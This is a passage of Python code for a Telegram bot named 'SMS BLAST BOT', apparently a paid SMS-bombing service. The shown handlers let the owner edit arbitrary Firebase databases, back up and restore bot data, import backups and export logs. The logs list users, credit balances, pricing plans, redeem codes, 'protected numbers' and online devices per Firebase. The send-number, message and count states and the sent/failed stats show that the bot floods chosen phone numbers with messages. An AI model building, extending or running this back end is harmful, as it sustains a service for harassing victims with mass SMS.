        f"<i>Key tap karke data dekho, ya neeche ke buttons se edit/delete karo:</i>",
        reply_markup=_fb_editor_menu_kb(keys),
        parse_mode="HTML"
    )
    return True


@R.message(S.fb_editor_url, F.text)
async def fb_editor_url_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!", parse_mode="HTML")
        return
    await _fb_editor_process_url(msg, state, msg.text or "")


@R.message(S.fb_editor_menu, F.text)
async def fb_editor_menu_text(msg: Message, state: FSMContext):
    """Menu par naya URL bhejo = usi DB par switch ho jao."""
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!", parse_mode="HTML")
        return
    txt = (msg.text or "").strip()
    if txt.startswith("http"):
        await _fb_editor_process_url(msg, state, txt)
    else:
        await msg.answer("Yahan sirf naya Firebase URL bhejo, ya menu buttons use karo.", parse_mode="HTML")


@R.callback_query(F.data == "fed:home")
async def fed_home(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await state.clear()
    await safe_answer(cq)
    await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")


@R.callback_query(F.data.startswith("fed:key:"))
async def fed_view_key(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    key = cq.data[len("fed:key:"):]
    if not _fb_path_ok(key):
        await safe_answer(cq, "Invalid key")
        return
    await safe_answer(cq, "⏳")
    status, data = await fb_http(base, key)
    if status != 200:
        try:
            await cq.message.answer(f"❌ Key read nahi hui (HTTP {status}).", parse_mode="HTML")
        except Exception:
            pass
        return
    await cq.message.answer(
        f"{em(EMOJI_STAR, '📄')} <b>Key:</b> <code>{key}</code>\n\n"
        f"<pre>{_json_view_html(data, 3500)}</pre>",
        parse_mode="HTML"
    )


@R.callback_query(F.data == "fed:raw")
async def fed_raw(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    await safe_answer(cq, "⏳")
    status, data = await fb_http(base, "")
    if status != 200:
        try:
            await cq.message.answer(f"❌ Root read nahi hua (HTTP {status}).", parse_mode="HTML")
        except Exception:
            pass
        return
    await cq.message.answer(
        f"{em(EMOJI_STAR, '📄')} <b>Raw JSON</b> — <code>{base}</code>\n\n"
        f"<pre>{_json_view_html(data, 3500)}</pre>",
        parse_mode="HTML"
    )


@R.callback_query(F.data == "fed:edit")
async def fed_edit_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    await safe_answer(cq)
    await state.set_state(S.fb_ed_path)
    await cq.message.edit_text(
        f"✏️ <b>Edit</b> — <code>{base}</code>\n\n"
        f"<b>Path bhejo</b> (jo modify karna hai):\n"
        f"<i>Example: <code>clients/abc123/sims</code> ya <code>settings/msg_delay</code></i>",
        reply_markup=kb([(f"{sc('cancel')}", "fed:home")]),
        parse_mode="HTML"
    )


@R.message(S.fb_ed_path, F.text)
async def fb_ed_path_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    path = (msg.text or "").strip().strip("/")
    if not _fb_path_ok(path):
        await msg.answer("❌ Invalid path (max 200 chars, spaces/.. nahi). Dobara bhejo:")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await state.clear()
        await msg.answer("Session expire — DB Editor se dobara start karo.")
        return
    status, cur = await fb_http(base, path)
    cur_view = _json_view_html(cur, 1500) if status == 200 else "(ye path abhi exist nahi karta — naya ban jayega)"
    await state.update_data(ed_path=path)
    await state.set_state(S.fb_ed_value)
    await msg.answer(
        f"✏️ <b>Path:</b> <code>{path}</code>\n\n"
        f"<b>Current value:</b>\n<pre>{cur_view}</pre>\n\n"
        f"<b>Naya JSON value bhejo</b> (valid JSON — object/array/string/number):",
        reply_markup=kb([(f"{sc('cancel')}", "fed:home")]),
        parse_mode="HTML"
    )


@R.message(S.fb_ed_value, F.text)
async def fb_ed_value_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    raw = (msg.text or "").strip()
    try:
        value = json.loads(raw)
    except Exception:
        await msg.answer("❌ Valid JSON nahi hai. Example: <code>{\"msg_delay\": 2}</code> — dobara bhejo:", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    path = fsmd.get("ed_path")
    if not base or not path:
        await state.clear()
        await msg.answer("Session expire — DB Editor se dobara start karo.")
        return
    status, resp = await fb_http(base, path, method="PUT", payload=value)
    upd = 200 <= status < 300
    ok, overview, keys = await _fb_overview(base)
    if ok:
        await state.set_state(S.fb_editor_menu)
        res_line = (
            f"{em(EMOJI_CHECK, '✅')} <b>Updated:</b> <code>{path}</code>\n\n"
            if upd else
            f"{em(EMOJI_CROSS, '❌')} <b>Update fail</b> (HTTP {status}): <code>{str(resp)[:150]}</code>\n\n"
        )
        await msg.answer(
            res_line + f"{em(EMOJI_FIRE, '🔥')} <b>Editor</b> — <code>{base}</code>\n\n{overview}",
            reply_markup=_fb_editor_menu_kb(keys),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            (f"✅ <b>Updated:</b> <code>{path}</code>" if upd else f"❌ Update fail (HTTP {status}): {str(resp)[:150]}")
        )


@R.callback_query(F.data == "fed:del")
async def fed_del_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await safe_answer(cq, "Session expire — DB Editor se dobara start karo", show_alert=True)
        return
    await safe_answer(cq)
    await state.set_state(S.fb_del_path)
    await cq.message.edit_text(
        f"🗑️ <b>Delete</b> — <code>{base}</code>\n\n"
        f"<b>Path bhejo jo DELETE karna hai</b> (⚠️ permanent!):\n"
        f"<i>Example: <code>clients/abc123</code></i>",
        reply_markup=kb([(f"{sc('cancel')}", "fed:home")]),
        parse_mode="HTML"
    )


@R.message(S.fb_del_path, F.text)
async def fb_del_path_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    path = (msg.text or "").strip().strip("/")
    if not _fb_path_ok(path):
        await msg.answer("❌ Invalid path (max 200 chars, spaces/.. nahi). Dobara bhejo:")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    if not base:
        await state.clear()
        await msg.answer("Session expire — DB Editor se dobara start karo.")
        return
    status, cur = await fb_http(base, path)
    cur_view = _json_view_html(cur, 1200) if status == 200 else "(path exist nahi karta)"
    await state.update_data(del_path=path)
    await msg.answer(
        f"⚠️ <b>Confirm:</b> <code>{path}</code> <b>DELETE</b> hoga?\n\n"
        f"<b>Current value:</b>\n<pre>{cur_view}</pre>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ HAAN, DELETE karo", callback_data="fed:confirm_del"),
             InlineKeyboardButton(text="❌ Cancel", callback_data="fed:home")]
        ]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "fed:confirm_del")
async def fed_confirm_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    fsmd = await state.get_data()
    base = fsmd.get("editor_url")
    path = fsmd.get("del_path")
    if not base or not path:
        await state.clear()
        await safe_answer(cq, "Session expire", show_alert=True)
        return
    status, resp = await fb_http(base, path, method="DELETE")
    okc = 200 <= status < 300
    await state.update_data(del_path=None)
    await safe_answer(cq, "🗑️ Deleted!" if okc else f"❌ Fail (HTTP {status})")
    ok, overview, keys = await _fb_overview(base)
    if ok:
        await state.set_state(S.fb_editor_menu)
        res_line = (
            f"{em(EMOJI_CROSS, '🗑️')} <b>Deleted:</b> <code>{path}</code>\n\n"
            if okc else
            f"{em(EMOJI_CROSS, '❌')} <b>Delete fail</b> (HTTP {status})\n\n"
        )
        try:
            await cq.message.edit_text(
                res_line + f"{em(EMOJI_FIRE, '🔥')} <b>Editor</b> — <code>{base}</code>\n\n{overview}",
                reply_markup=_fb_editor_menu_kb(keys),
                parse_mode="HTML"
            )
        except TelegramBadRequest:
            pass


@R.callback_query(F.data == "fed:rescan")
async def fed_rescan(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq, "🔄")
    ensure_scan_running()
    try:
        await cq.message.edit_text(
            "🔄 <b>Scan chalu ho gaya</b> (~3-4 min).\n\nComplete hone par button dabao:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Check Now", callback_data="owner:check_devices")]
            ]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass


@R.callback_query(F.data == "owner:backup_fb")
async def owner_backup_fb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq)
    url = get_backup_fb_url(d)
    if not url:
        await state.set_state(S.set_backup_fb)
        await cq.message.edit_text(
            "📦 <b>Backup Firebase Setup</b>\n\n"
            "Apni <b>public Firebase DB</b> ka URL bhejo:\n<code>https://xxx-default-rtdb.firebaseio.com</code>\n\n"
            "<i>Bot ka poora data isme hourly + har 15 min save pe push hota hai.\n"
            "Restart pe DB gayab/corrupt ho toh isi se AUTO-IMPORT hota hai — "
            "Render wipe se data safe.</i>\n\n"
            "⚠️ <i>Public DB hai — URL wala data dekh sakta hai, sirf apna trusted URL use karo.</i>",
            reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    await state.clear()
    host = url.split("//", 1)[-1]
    last = now_ist().strftime("%Y-%m-%d %H:%M:%S (IST)") if _LAST_FB_BACKUP_TS[0] else "is session mein abhi nahi"
    await cq.message.edit_text(
        f"📦 <b>Backup Firebase</b>\n\n<code>{host}</code>\n\n"
        f"⏱ Last push: {last}\n🕐 Schedule: <b>hourly + har 15 min save pe</b>\n"
        f"♻️ Restart pe: DB missing/corrupt → isi se <b>auto-import</b>\n\n"
        "⚠️ <i>Public DB — sirf apna trusted URL use karo</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Backup Now", callback_data="obfb:do"),
             InlineKeyboardButton(text="♻️ Restore", callback_data="obfb:restore")],
            [InlineKeyboardButton(text="✏️ Change URL", callback_data="obfb:change"),
             InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="fed:home")]
        ]),
        parse_mode="HTML"
    )


# ── ♻️ FIREBASE RESTORE PICKER — latest + snapshots list, pick karke import ──
def _fb_node_label(node: str, meta: dict) -> str:
    """List button ke liye short label."""
    try:
        ts = datetime.fromtimestamp(int(meta.get("ts", 0)), _IST).strftime("%d-%m %H:%M")
    except Exception:
        ts = "?"
    users = meta.get("users", 0)
    fbs = meta.get("firebases", 0)
    if node == "latest":
        return f"♻️ LATEST ({ts} IST, {users}u/{fbs}db)"
    return f"♻️ {ts} IST ({users}u/{fbs}db)"


@R.callback_query(F.data == "obfb:restore")
async def obfb_restore_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫", show_alert=True)
        return
    await safe_answer(cq, "⏳ Firebase se backup list laayi ja rahi...")
    url = get_backup_fb_url(d)
    if not url:
        try:
            await cq.message.edit_text("❌ Pehle Backup Firebase URL set karo (Change URL).",
                                        reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except TelegramBadRequest:
            pass
        return
    entries = []  # (node, meta)
    st, meta = await fb_http(url, "bot_backup/latest/meta", timeout=30)
    if st == 200 and isinstance(meta, dict) and isinstance(meta.get("parts"), int):
        entries.append(("latest", meta))
    st2, snaps = await fb_http(url, "bot_backup/snap", query="shallow=true", timeout=30)
    if st2 == 200 and isinstance(snaps, dict):
        for k in sorted(snaps.keys(), reverse=True):
            st3, m3 = await fb_http(url, f"bot_backup/snap/{k}/meta", timeout=30)
            if st3 == 200 and isinstance(m3, dict) and isinstance(m3.get("parts"), int):
                entries.append((f"snap/{k}", m3))
            if len(entries) >= 7:
                break
    if not entries:
        try:
            await cq.message.edit_text(
                "❌ Firebase mein koi valid backup nahi mila.\n\n"
                "<i>Pehle '🔄 Backup Now' se ek backup push karo.</i>",
                reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except TelegramBadRequest:
            pass
        return
    lines = ["♻️ <b>Restore from Firebase</b>\n\n"]
    rows = []
    for i, (node, meta) in enumerate(entries):
        lines.append(f"{i + 1}. <b>{_fb_node_label(node, meta)}</b> — {_human_size(meta.get('size_raw', 0))} DB")
        rows.append([InlineKeyboardButton(text=_fb_node_label(node, meta)[:60],
                                          callback_data=f"obfb:restore:do:{node}")])
    rows.append([InlineKeyboardButton(text="⬅️ Wapas", callback_data="owner:backup_fb")])
    lines.append("\n⚠️ <i>Choose karo — current DB ka local backup ban jayega, phir chosen data main DB ban jayega.</i>")
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest as e:
        log.warning(f"[RESTORE-LIST] edit fail: {e}")


@R.callback_query(F.data.startswith("obfb:restore:do:"))
async def obfb_restore_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫", show_alert=True)
        return
    node = cq.data.split("obfb:restore:do:", 1)[1]
    if not (node == "latest" or (node.startswith("snap/") and len(node.split("/", 1)[1]) == 15)):
        await safe_answer(cq, "❌ Invalid backup node.", show_alert=True)
        return
    await safe_answer(cq)
    label = "LATEST" if node == "latest" else f"SNAP {node.split('/', 1)[1]}"
    try:
        await cq.message.edit_text(
            f"⚠️ <b>Confirm Restore</b>\n\n"
            f"Source: <b>{label}</b>\n\n"
            "1️⃣ Current main DB ka pehle local backup banega (safe)\n"
            "2️⃣ Chosen backup main DB ki jagah aayega\n"
            "3️⃣ Firebase latest usi data se re-sync hoga\n\n"
            "<i>Bot iske baad turant naye data par chalta hai — restart nahi chahiye.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Haan, restore karo", callback_data=f"obfb:restore:go:{node}")],
                [InlineKeyboardButton(text="❌ Wapas", callback_data="obfb:restore")]
            ]),
            parse_mode="HTML"
        )
    except TelegramBadRequest as e:
        log.warning(f"[RESTORE-CONFIRM] edit fail: {e}")


@R.callback_query(F.data.startswith("obfb:restore:go:"))
async def obfb_restore_go(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫", show_alert=True)
        return
    node = cq.data.split("obfb:restore:go:", 1)[1]
    if not (node == "latest" or (node.startswith("snap/") and len(node.split("/", 1)[1]) == 15)):
        await safe_answer(cq, "❌ Invalid backup node.", show_alert=True)
        return
    await safe_answer(cq, "⏳ Firebase se data aa raha hai...")
    url = get_backup_fb_url(d)
    if not url:
        try:
            await cq.message.edit_text("❌ Firebase URL set nahi hai!", parse_mode="HTML")
        except TelegramBadRequest:
            pass
        return
    try:
        # Safety: current DB ki local copy
        try:
            make_local_backup()
        except Exception:
            pass
        ok, data = await _fb_read_node(url, f"bot_backup/{node}")
        if not ok:
            try:
                await cq.message.edit_text(f"❌ <b>Restore fail:</b> Firebase se data padh nahi paya ({node}).",
                                            reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
            except TelegramBadRequest:
                pass
            return
        _fb_write_restore(data)
        n_users = len(data.get("users", {}) or {})
        n_fbs = len(data.get("firebases", []) or [])
        try:
            log_activity(load(), "fb_restore_manual", cq.from_user.id, f"node={node}, users={n_users}, dbs={n_fbs}")
        except Exception:
            pass
        # Firebase latest ko current (restored) state se re-sync karo
        try:
            _LAST_FB_BACKUP_TS[0] = time.time()
            asyncio.get_running_loop().create_task(fb_cloud_backup(load()))
        except Exception:
            pass
        try:
            await cq.message.edit_text(
                f"✅ <b>Restore complete!</b>\n\n"
                f"Source: <b>{'LATEST' if node == 'latest' else 'SNAP ' + node.split('/', 1)[1]}</b>\n"
                f"👥 Users: <b>{n_users}</b> | 🔥 Firebase DBs: <b>{n_fbs}</b>\n\n"
                "<i>Bot ab isi data par chal raha hai. Firebase latest bhi re-sync ho raha hai.</i>",
                reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"
            )
        except TelegramBadRequest as e:
            log.warning(f"[RESTORE-GO] edit fail: {e}")
    except Exception as e:
        log.error(f"[RESTORE-GO] error: {e}")
        try:
            await cq.message.edit_text(f"❌ Restore error: {str(e)[:200]}",
                                        reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except TelegramBadRequest:
            pass


@R.callback_query(F.data == "obfb:change")
async def obfb_change(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq)
    await state.set_state(S.set_backup_fb)
    await cq.message.edit_text(
        "✏️ <b>Naya Backup Firebase URL</b> bhejo:\n<code>https://xxx-default-rtdb.firebaseio.com</code>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.set_backup_fb, F.text)
async def set_backup_fb_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    url = (msg.text or "").strip().rstrip("/")
    if not _fb_base_ok(url):
        await msg.answer("❌ Sirf Firebase DB URL allowed (https + firebaseio.com / firebasedatabase.app). Dobara bhejo:")
        return
    d["backup_fb_url"] = url
    save(d)
    ok, info = await fb_cloud_backup(load())
    line = f"✅ <b>Pehla backup complete!</b> ({info})" if ok else f"⚠️ URL save ho gaya lekin pehla backup fail: {info}"
    await state.clear()
    await msg.answer(
        f"📦 <b>Backup Firebase set:</b> <code>{url.split('//', 1)[-1]}</code>\n\n{line}\n\n"
        "Ab har 15 min save pe + hourly data isme push hota hai, aur restart pe isi se auto-import hoga.",
        parse_mode="HTML"
    )


@R.callback_query(F.data == "obfb:do")
async def obfb_do_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq, "⏳ Backup ho raha...")
    ok, info = await fb_cloud_backup(d)
    line = f"✅ <b>Backup complete!</b> {info}" if ok else f"❌ <b>Backup fail:</b> {info}"
    host = get_backup_fb_url(d).split("//", 1)[-1]
    try:
        await cq.message.edit_text(f"{line}\n\n<code>{host}</code>", parse_mode="HTML")
    except TelegramBadRequest:
        await cq.message.answer(line, parse_mode="HTML")


@R.callback_query(F.data == "owner:import_db")
async def owner_import_db_start(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not is_owner(uid, load()):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.import_db)
    await cq.message.edit_text(
        "📥 <b>Database Import</b>\n\n"
        "Apni backup wali <code>.json</code> ya <code>.gz</code> file bhejo (max 40MB).\n"
        "<i>Channel ka latest backup .gz hota hai — wahi bhejna best hai.</i>\n\n"
        "📦 Pehle aapka current DB auto-backup hoga (file mil jayegi)\n"
        "⚠️ Import ke baad bot turant naye data par chalta hai\n\n"
        "<i>Cancel: " + f"{sc('cancel')}" + " button ya /cancel text</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.import_db, F.document)
async def owner_import_db_done(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if not is_owner(uid, load()):
        await state.clear()
        return
    fname = (msg.document.file_name or "").lower()
    is_gz = fname.endswith(".gz")
    if not (is_gz or fname.endswith(".json")):
        await msg.answer("❌ Sirf <code>.json</code> ya <code>.gz</code> (backup) file bhejo!", parse_mode="HTML")
        return
    # .gz chhota hota hai (40MB DB ~ 4MB) — isliye .gz ke liye 40MB limit;
    # raw .json ke liye 20MB (Bot API download limit isse badi file allow nahi karta)
    limit = 40 * 1024 * 1024 if is_gz else 20 * 1024 * 1024
    if msg.document.file_size and msg.document.file_size > limit:
        extra = "" if is_gz else " — .gz wala file chhota hota hai, channel se .gz download karke bhejo"
        await msg.answer(f"❌ File {limit//1024//1024}MB se badi nahi ho sakti{extra}!", parse_mode="HTML")
        return

    buf = io.BytesIO()
    await msg.bot.download(msg.document, destination=buf)
    raw = buf.getvalue()
    if raw[:2] == b"\x1f\x8b":  # gzip magic — extension chahe .json ho ya .gz
        try:
            raw = gzip.decompress(raw)
        except Exception as e:
            await state.clear()
            await msg.answer(f"❌ GZIP decompress fail: {e}", parse_mode="HTML")
            return
    try:
        data = json.loads(raw.decode("utf-8"))
    except Exception as e:
        await state.clear()
        await msg.answer(f"❌ Invalid JSON: {e}", parse_mode="HTML")
        return

    if not isinstance(data, dict) or "users" not in data:
        await state.clear()
        await msg.answer("❌ Ye blast bot ka backup file nahi lagta! ('users' key missing)", parse_mode="HTML")
        return

    # missing keys ko default se fill karo
    for k, v in _default_data().items():
        data.setdefault(k, v)
    if MAIN_OWNER not in data.get("owners", []):
        data["owners"].insert(0, MAIN_OWNER)

    # current DB ka backup rakho
    backup_name = f"blast_data_preimport_{now_ist().strftime('%Y%m%d_%H%M%S')}.json"
    have_backup = os.path.exists(_DATA_FILE)
    if have_backup:
        shutil.copy2(_DATA_FILE, backup_name)

    # atomic write
    tmp = _DATA_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    os.replace(tmp, _DATA_FILE)

    global PROTECTED_NUMBERS
    PROTECTED_NUMBERS = data.get("protected_numbers", {})
    log_activity(data, "db_import", uid, f"Imported {len(data.get('firebases', []))} DBs, {len(data.get('users', {}))} users")
    save(data)

    await state.clear()
    if have_backup:
        try:
            await msg.answer_document(
                document=FSInputFile(backup_name),
                caption="📦 Pehle aapka PURANA DB backup — safe jagah rakh lo!"
            )
        except Exception:
            pass
    await msg.answer(
        "✅ <b>Database Import Complete!</b>\n\n"
        f"👥 Users: <b>{len(data.get('users', {}))}</b>\n"
        f"🔥 Firebase DBs: <b>{len(data.get('firebases', []))}</b>\n"
        f"📊 Total Sent: <b>{data.get('stats', {}).get('total_sent', 0)}</b>\n"
        f"❌ Total Failed: <b>{data.get('stats', {}).get('total_failed', 0)}</b>\n\n"
        "<i>Bot ab isi data par chala raha hai — restart ki zaroorat nahi. Scanner ab 24 ghante mein 1 baar chalta hai (cached results turant dikhte hain).</i>",
        parse_mode="HTML"
    )


@R.message(S.import_db)
async def owner_import_db_wrong(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    if msg.text and "/cancel" in msg.text:
        await state.clear()
        await msg.answer("❌ Import cancel ho gaya.")
        return
    await msg.answer("❌ Sirf .json FILE bhejo (document). Text se nahi hoga!", parse_mode="HTML")


_FSM_TEXT_STATES = [
    S.send_number,
    S.send_message,
    S.send_count,
    S.owner_send_number,
    S.owner_send_message,
    S.owner_send_count,
    S.admin_send_number,
    S.admin_send_message,
    S.admin_send_count,
    S.protect_number,
    S.track_number,
    S.add_all_credits_amount,
    S.deduct_all_credits_amount,
    S.transfer_credits_uid,
    S.transfer_credits_amount,
    S.add_firebase,
    S.add_owner,
    S.add_admin,
    S.ban_user,
    S.fj_add_channel,
    S.fj_add_link,
    S.add_plan_name,
    S.add_plan_price,
    S.add_plan_credits,
    S.add_plan_link,
    S.gen_redeem_credits,
    S.gen_redeem_uses,
    S.add_credits_uid,
    S.add_credits_amount,
    S.deduct_credits_uid,
    S.deduct_credits_amount,
    S.set_ref_credits,
    S.redeem_code,
    S.fb_editor_url,
    S.fb_editor_menu,
    S.fb_ed_path,
    S.fb_ed_value,
    S.fb_del_path,
    S.set_backup_fb,
]


@R.message(F.state.in_(_FSM_TEXT_STATES))
async def fsm_wrong_content_type(msg: Message, state: FSMContext):
    # Text ke liye wala handler pehle match ho chuka hai;
    # yahan sticker/photo/video/voice waghera girega
    await msg.answer("⚠️ <b>Yahan sirf TEXT bhejo!</b>\n\n<i>Sticker/photo/video kaam nahi karega — jo step chal raha hai uska TEXT bhejo.</i>", parse_mode="HTML")


@R.message(Command("logs"))
async def cmd_logs(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    if not is_owner(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Owner only!", parse_mode="HTML")
        return

    # Collect all logs
    log_lines = []
    log_lines.append("=" * 60)
    log_lines.append("  SMS BLAST BOT - FULL DATABASE LOG EXPORT")
    log_lines.append(f"  Exported by: {uid} | Time: {now_ist().strftime('%Y-%m-%d %H:%M:%S')}")
    log_lines.append("=" * 60)
    log_lines.append("")

    # 1. Bot Info
    log_lines.append("[BOT INFO]")
    log_lines.append(f"Version: {_VERSION}")
    log_lines.append(f"Main Owner: {MAIN_OWNER}")
    log_lines.append(f"Super Admin: {SUPER_ADMIN_NAME}")
    log_lines.append(f"Log Channel: {LOG_CHANNEL_ID}")
    log_lines.append("")

    # 2. Owners & Admins
    log_lines.append("[OWNERS & ADMINS]")
    log_lines.append(f"Owners ({len(d.get('owners', []))}): {d.get('owners', [])}")
    log_lines.append(f"Admins ({len(d.get('admins', []))}): {d.get('admins', [])}")
    log_lines.append(f"Banned ({len(d.get('banned', []))}): {d.get('banned', [])}")
    log_lines.append("")

    # 3. Settings
    log_lines.append("[SETTINGS]")
    settings = d.get("settings", {})
    log_lines.append(f"Free Mode: {d.get('free_mode', False)}")
    log_lines.append(f"Ref Credits: {settings.get('ref_credits', 3)}")
    log_lines.append(f"Max Owners: {settings.get('max_owners', 6)}")
    log_lines.append("")

    # 4. Force Join Channels
    fj = d.get("force_join", {})
    log_lines.append(f"[FORCE JOIN] Enabled: {fj.get('enabled', False)}")
    for ch in fj.get("channels", []):
        log_lines.append(f"  - {ch.get('title', 'Channel')} | ID: {ch.get('id')} | Link: {ch.get('link')} | Required: {ch.get('required', True)}")
    log_lines.append("")

    # 5. Firebase DBs
    fbs = d.get("firebases", [])
    log_lines.append(f"[FIREBASE DATABASES] Total: {len(fbs)}")
    for fb in fbs:
        fb_count = FB_DEVICE_COUNTS.get(fb['id'], {})
        log_lines.append(f"  - ID: {fb['id']}")
        log_lines.append(f"    Label: {fb.get('label', 'N/A')}")
        log_lines.append(f"    URL: {fb['url']}")
        log_lines.append(f"    Added: {fmt_time(fb.get('added_at', 0))}")
        log_lines.append(f"    Online Devices: {fb_count.get('online', 0)}")
    log_lines.append("")

    # 6. Users
    users = d.get("users", {})
    log_lines.append(f"[USERS] Total: {len(users)}")
    for uid_str, udata in users.items():
        log_lines.append(f"  User ID: {uid_str}")
        log_lines.append(f"    Name: {udata.get('name', 'Unknown')}")
        log_lines.append(f"    Credits: {udata.get('credits', 0)}")
        log_lines.append(f"    Manual Added: {udata.get('manual_added_credits', 0)}")
        log_lines.append(f"    Uses: {udata.get('uses', 0)}")
        log_lines.append(f"    Joined: {fmt_time(udata.get('joined_at', 0))}")
        log_lines.append(f"    Refer Code: {udata.get('refer_code', 'None')}")
        log_lines.append(f"    Referred By: {udata.get('referred_by', 'None')}")
    log_lines.append("")

    # 7. Stats
    stats = d.get("stats", {})
    log_lines.append("[STATS]")
    log_lines.append(f"Total Sent: {stats.get('total_sent', 0)}")
    log_lines.append(f"Total Failed: {stats.get('total_failed', 0)}")
    api_usage = stats.get("api_usage", {})
    if api_usage:
        log_lines.append("Per Firebase Usage:")
        for fb_id, fb_stats in api_usage.items():
            log_lines.append(f"  - {fb_id}: Sent={fb_stats.get('sent', 0)}, Failed={fb_stats.get('failed', 0)}")
    log_lines.append("")

    # 8. Protected Numbers
    protected = d.get("protected_numbers", {})
    log_lines.append(f"[PROTECTED NUMBERS] Total: {len(protected)}")
    for num, protector in protected.items():
        log_lines.append(f"  - {num} | Protected By: {protector}")
    log_lines.append("")

    # 9. Pricing Plans
    plans = d.get("pricing", {}).get("plans", [])
    log_lines.append(f"[PRICING PLANS] Total: {len(plans)}")
    for plan in plans:
        log_lines.append(f"  - {plan.get('name', 'Plan')}: {plan.get('price', 0)} {plan.get('currency', 'INR')} = {plan.get('credits', 0)} credits")
    log_lines.append("")

    # 10. Redeem Codes
    codes = d.get("redeem_codes", {})
    log_lines.append(f"[REDEEM CODES] Total: {len(codes)}")
    for code, cdata in codes.items():
        log_lines.append(f"  - {code}: {cdata.get('credits', 0)} credits | Uses Left: {cdata.get('uses_left', 0)} | Used By: {len(cdata.get('used_by', []))}")
    log_lines.append("")

    # 11. Videos
    videos = d.get("videos", [])
    log_lines.append(f"[VIDEOS] Total: {len(videos)}")
    for i, vid in enumerate(videos, 1):
